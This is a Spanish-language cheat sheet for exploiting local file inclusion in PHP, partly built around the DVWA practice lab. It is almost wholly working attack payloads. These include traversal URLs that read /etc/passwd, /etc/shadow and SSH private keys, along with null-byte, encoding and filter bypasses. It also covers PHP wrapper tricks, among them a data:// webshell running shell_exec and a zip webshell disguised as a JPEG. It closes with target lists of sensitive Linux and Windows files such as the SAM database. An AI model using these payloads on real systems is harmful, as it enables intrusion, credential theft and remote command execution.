# _LFI_cheat-sheet_
los importantes metodos para enumerar la vulnerabilidad de LFI

# _enumerar archivos del sistema linux si contiene una vulnerabilidad LFI_

     1=Low File Inclusion Source
        <?php
                // The page we wish to display
                $file = $_GET[ 'page' ];
        ?>
    http://localhost/vulnerabilities/fi/?page=file1.php/
    #http://localhost/vulnerabilities/fi/?page=/etc/passwd/
    #http://localhost/vulnerabilities/fi/?page=../../../../../etc/passwd/
    #http://localhost/vulnerabilities/fi/?page=/etc/passwd?
    #http://localhost/vulnerabilities/fi/?page=../../../../../etc/passwd?
    #http://localhost/vulnerabilities/fi/?page=/etc/group/
    #http://localhost/vulnerabilities/fi/?page=../../../../../etc/group/
    #http://localhost/vulnerabilities/fi/?page=/etc/shadow/
    #http://localhost/vulnerabilities/fi/?page=../../../../../etc/shadow/
    #http://localhost/vulnerabilities/fi/?page=/etc/issue/
    #http://localhost/vulnerabilities/fi/?page=../../../../../etc/issue/
    #http://localhost/vulnerabilities/fi/?page=/etc/hostname/
    #http://localhost/vulnerabilities/fi/?page=../../../../../etc/hostname/
    #http://localhost/vulnerabilities/fi/?page=/etc/ssh/ssh_config/
    #http://localhost/vulnerabilities/fi/?page=../../../../../etc/ssh/ssh_config/
    #http://localhost/vulnerabilities/fi/?page=/etc/ssh/sshd_config/
    #http://localhost/vulnerabilities/fi/?page=../../../../../etc/ssh/sshd_config/
    #http://localhost/vulnerabilities/fi/?page=../../../../../root/.ssh/id_rsa
    #http://localhost/vulnerabilities/fi/?page=/root/.ssh/id_rsa
    #http://localhost/vulnerabilities/fi/?page=/root/.ssh/authorized_keys
    #http://localhost/vulnerabilities/fi/?page=../../../../../root/.ssh/authorized_keys
    #http://localhost/vulnerabilities/fi/?page=/home/user/.ssh/id_rsa
    #http://localhost/vulnerabilities/fi/?page=../../../../../home/user/.ssh/id_rsa
    #http://localhost/vulnerabilities/fi/?page=/home/user/.ssh/authorized_keys
    #http://localhost/vulnerabilities/fi/?page=../../../../../home/user/.ssh/authorized_keys
    #http://localhost/vulnerabilities/fi/?page=../../../../../proc/net/fib_trie
    #http://localhost/vulnerabilities/fi/?page=../../../../../proc/net/sched_debug
    #http://localhost/vulnerabilities/fi/?page=../../../../../proc/net/tcp
    #http://localhost/vulnerabilities/fi/?page=/config.inc.php
    
    ====>ENCODING WRAPPER "base64"
    http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/etc/passwd
    cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb==
    ====>NULL BYTE INJECTION
    http://localhost/vulnerabilities/fi/?page=../../../../../etc/passwd%00


# _enumerar archivos del sistema linux si contiene una vulnerabilidad LFI_

    2= Medium File Inclusion Source

    <?php

            // The page we wish to display
            $file = $_GET[ 'page' ];

            // Input validation
            $file = str_replace( array( "http://", "https://" ), "", $file );
            $file = str_replace( array( "../", "..\"" ), "", $file );
    ?>
    Para LFI, las palabras clave de recorrido de directorio ../../ siguen siendo válidas para usar este sitio web, por lo que podemos usar las mismas palabras que usamos desde un nivel bajo.
    
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=/etc/passwd
    #http://localhost/vulnerabilities/fi/?page=/etc/passwd
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=/etc/hostname
    #http://localhost/vulnerabilities/fi/?page=/etc/hostname
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=/etc/issue
    #http://localhost/vulnerabilities/fi/?page=/etc/issue
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=/etc/hosts
    #http://localhost/vulnerabilities/fi/?page=/etc/hosts
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=/etc/ssh/ssh_config
    #http://localhost/vulnerabilities/fi/?page=/etc/ssh/ssh_config
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=/etc/group
    #http://localhost/vulnerabilities/fi/?page=/etc/group
    *se puede leer "archivos locales"*
    *como vemos podemos saltar el filtro del "directorio PATH". Ejemplo: "../../../..//etc/passwd"*
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../..//etc/passwd
    #http://localhost/vulnerabilities/fi/?page=../../../../..//etc/passwd
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../..//etc/group
    #http://localhost/vulnerabilities/fi/?page=../../../../..//etc/group
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../..//etc/hosts
    #http://localhost/vulnerabilities/fi/?page=../../../../..//etc/hosts
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../..//etc/hostname
    #http://localhost/vulnerabilities/fi/?page=../../../../..//etc/hostname
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../..//etc/issue
    #http://localhost/vulnerabilities/fi/?page=../../../../..//etc/issue
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../..//etc/ssh/ssh_config
    #http://localhost/vulnerabilities/fi/?page=../../../../..//proc/net/fib_trie
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../..//proc/net/fib_trie
    #http://localhost/vulnerabilities/fi/?page=../../../../..//proc/net/sched_debug
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../..//proc/net/sched_debug
    #http://localhost/vulnerabilities/fi/?page=../../../../..//etc/ssh/ssh_config
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=etc/ssh/ssh_config
    ###IMPORTANTE A SEÑALAR EL proc/net/tcp ###
    #http://localhost/vulnerabilities/fi/?page=../../../../..//proc/net/tcp
    #http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../../proc/net/tcp
    #cat port.txt | awk -F: '{print $3}' | awk '{print $1}' > puerto.txt
    #cat puerto.txt | sort -u | while read port; do echo "[+] Puerto $port -> $((0x$port))"; done
    #cat puerto.txt | sort -u | while read port; do echo "[+] Puerto $port -> $((16#$port))"; done
    
    ====>ENCODING WRAPPER "base64"
    http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/etc/passwd
    cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb==
    ====>NULL BYTE INJECTION
    http://localhost/vulnerabilities/fi/?page=php://filter/resource=../../../../../etc/passwd%00
    http://localhost/vulnerabilities/fi/?page=php://filter/resource=/etc/passwd%00


# _enumerar archivos del sistema linux si contiene una vulnerabilidad LFI_
    
    #High File Inclusion Source
    <?php
    // The page we wish to display
    $file = $_GET[ 'page' ];
    // Input validation
    if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
        // This isn't the page we want!
        echo "ERROR: File not found!";
        exit;
    }
    ?>
    #como vemos no podemos hacer *path traversal* lo que podemos es usar ""wrappers"" de la siguientes formas

    #http://localhost/vulnerabilities/fi/?page=file:///etc/passwd
    #http://localhost/vulnerabilities/fi/?page=file:///etc/hostname
    #http://localhost/vulnerabilities/fi/?page=file:///etc/hosts
    #http://localhost/vulnerabilities/fi/?page=file:///etc/issue
    #http://localhost/vulnerabilities/fi/?page=file:///etc/group
    #http://localhost/vulnerabilities/fi/?page=file:///proc/net/fib_trie
    #http://localhost/vulnerabilities/fi/?page=file:///proc/net/tcp
    #http://localhost/vulnerabilities/fi/?page=file:///proc/sched_debug
    #http://localhost/vulnerabilities/fi/?page=file:///etc/ssh/ssh_config
    #http://localhost/vulnerabilities/fi/?page=file:///etc/shadow/
    #http://localhost/vulnerabilities/fi/?page=file:///etc/ssh/ssh_config/
    #http://localhost/vulnerabilities/fi/?page=file:///etc/ssh/sshd_config/
    #http://localhost/vulnerabilities/fi/?page=file:///root/.ssh/id_rsa
    #http://localhost/vulnerabilities/fi/?page=file:///root/.ssh/authorized_keys
    #http://localhost/vulnerabilities/fi/?page=file:///home/user/.ssh/id_rsa
    #http://localhost/vulnerabilities/fi/?page=file:///home/user/.ssh/authorized_keys

    #http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/etc/passwd


# _Null Byte:_
    Es habitual encontrarnos con php que permiten LFI y nos añaden una extensión:

    <?
      $file = $_GET['file'];
      require($file . ".php");
    ?>
    http://ex.com/index.php?page=../../../etc/passwd%00

# _Url-Encode:_
    http://ex.com/index.php?page=%252e%252e%252fetc%252fpasswd

# _Bypass filtro:_
    http://ex.com/index.php?page=..///////..////..//////etc/passwd
    http://ex.com/index.php?page=….//….//….//….//etc/passwd

# _Path Truncation_
    http://ex.com/index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
    http://ex.com/index.php?page=../../../../[…]../../../../../etc/passwd

# _LFI Wrappers:_
    #Php incorpora una serie de envolturas para distintos protocolos tipo URL para trabajar junto con funciones del sistema, son los llamados wrappers.

    #PHP Wrapper expect://
        http://ex.com/index.php?page=expect://whoami

    #PHP Wrapper data://
        http://www.ex.com/index.php?page=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>

    #PHP Wrapper filter://
        http://ex.com/index.php?page=php://filter/read=string.rot13/resource=index.php
        http://ex.com/index.php?page=php://filter/convert.base64-encode/resource=index.php

    #PHP Wrapper zip://
        echo "<?php \$_GET['param1'](\$_GET['param2']); ?>" > shell.php
        zip -0 payload.zip payload.php;   
        mv payload.zip shell.jpg;    
        rm payload.php
        http://ex.com/index.php?page=zip://shell.jpg%23payload.php

# _Archivos Importante a Revisar en Linux_

    /etc/issue 
    /etc/motd 
    /etc/passwd 
    /etc/group 
    /etc/resolv.conf
    /etc/shadow
    /home/[USERNAME]/.bash_history o .profile
    ~/.bash_history o .profile
    $USER/.bash_history o .profile
    /root/.bash_history o .profile
    /etc/mtab  
    /etc/inetd.conf  
    /var/log/dmessage
    .htaccess
    config.php
    authorized_keys
    id_rsa
    id_rsa.keystore
    id_rsa.pub
    known_hosts
    /etc/httpd/logs/acces_log 
    /etc/httpd/logs/error_log 
    /var/www/logs/access_log 
    /var/www/logs/access.log 
    /usr/local/apache/logs/access_log 
    /usr/local/apache/logs/access.log 
    /var/log/apache/access_log 
    /var/log/apache2/access_log 
    /var/log/apache/access.log 
    /var/log/apache2/access.log
    /var/log/apache/error.log
    /var/log/apache/access.log
    /var/log/httpd/error_log
    /var/log/access_log
    /var/log/mail
    /var/log/sshd.log
    /var/log/vsftpd.log
    .bash_history
    .mysql_history
    .my.cnf
    /proc/sched_debug
    /proc/mounts
    /proc/net/arp
    /proc/net/route
    /proc/net/tcp
    /proc/net/udp
    /proc/net/fib_trie
    /proc/version
    /proc/self/environ

# _Archivos importante a revisar en Windows_

    c:\WINDOWS\system32\eula.txt
    c:\boot.ini  
    c:\WINDOWS\win.ini  
    c:\WINNT\win.ini  
    c:\WINDOWS\Repair\SAM  
    c:\WINDOWS\php.ini  
    c:\WINNT\php.ini  
    c:\Program Files\Apache Group\Apache\conf\httpd.conf  
    c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
    c:\Program Files\xampp\apache\conf\httpd.conf  
    c:\php\php.ini  
    c:\php5\php.ini  
    c:\php4\php.ini  
    c:\apache\php\php.ini  
    c:\xampp\apache\bin\php.ini  
    c:\home2\bin\stable\apache\php.ini  
    c:\home\bin\stable\apache\php.ini
    c:\Program Files\Apache Group\Apache\logs\access.log  
    c:\Program Files\Apache Group\Apache\logs\error.log
    c:\WINDOWS\TEMP\  
    c:\php\sessions\  
    c:\php5\sessions\  
    c:\php4\sessions\
    windows\repair\SAM
    %SYSTEMROOT%\repair\SAM
    %SYSTEMROOT%\System32\config\RegBack\SAM
    %SYSTEMROOT%\System32\config\SAM
    %SYSTEMROOT%\repair\system
    %SYSTEMROOT%\System32\config\SYSTEM
    %SYSTEMROOT%\System32\config\RegBack\system
    
